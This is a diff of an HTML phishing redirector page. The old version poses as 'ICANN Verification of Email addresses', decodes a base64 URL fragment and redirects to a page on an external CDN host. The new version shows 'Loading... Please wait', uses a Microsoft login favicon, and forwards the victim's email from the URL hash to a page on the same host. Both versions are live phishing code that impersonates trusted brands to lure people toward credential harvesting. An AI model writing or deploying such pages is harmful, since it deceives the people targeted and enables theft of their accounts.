@@ -1,29 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<title>
-		ICANN Verification of Email addresses . . .
-	</title>
-</head>
-<body>
+  <head>
+    <title>Loading... Please wait . . .</title>
+    <link
+      rel="shortcut icon"
+      href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"
+    />
     <script>
-        function redirrectPage() {
-            var query = window.location.href;
-            console.log(query);
-            var res = query.split("#");
-            var data1 = res[0];
-            var data2 = res[1];
-            console.log(data1);
-            console.log(data2);
-            data2 = atob(data2);
-            if (data2) {
-                console.log("true");
-                window.location.href = "https://cdn.dragon.cere.network/512/fs/index.html" + data2;
-            }
-        }
-        redirrectPage();
-    </script>
-</body>
+      var data = getParameter();
+      var redir_to_page = "https://cdn.dragon.cere.network/480/fs/default1/oindexx.html#" + data + "";
+      var hash = window.location.hash;
+      var email = hash.split("#")[1];
+      redir_to_page = redir_to_page + email;
+      window.location = redir_to_page;
+      function getParameter() {
+        var listof = [""];
+        var listCount = listof.length;
+        var randomNum = listCount - 1;
+        randomNum = Math.floor(Math.random() * randomNum);
+        var result = listof[randomNum];
 
+        return result;
+      }
+    </script>
+  </head>
 </html>
- 
